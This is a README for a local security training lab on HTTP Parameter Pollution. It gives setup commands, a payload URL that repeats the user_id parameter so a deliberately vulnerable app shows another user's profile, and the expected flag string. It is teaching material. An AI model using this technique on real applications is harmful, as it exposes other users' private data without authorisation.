# Lab 013

Exploit HTTP Parameter Pollution to bypass profile parameter validation.

## Goal

Abuse repeated `user_id` parameters so the application validates one value but displays another user's profile.

## Run

```bash
git clone https://github.com/elisonkaloshi/labs-013.git
cd labs-013
chmod +x setup.sh
./setup.sh
source .venv/bin/activate
python app.py
```

Open:

```text
http://127.0.0.1:5013
```

Normal profile request:

```text
http://127.0.0.1:5013/profile?user_id=1001
```

HTTP Parameter Pollution payload:

```text
http://127.0.0.1:5013/profile?user_id=1001&user_id=1002
```

Successful exploitation returns:

```text
Secret: LAB-013-HPP
```
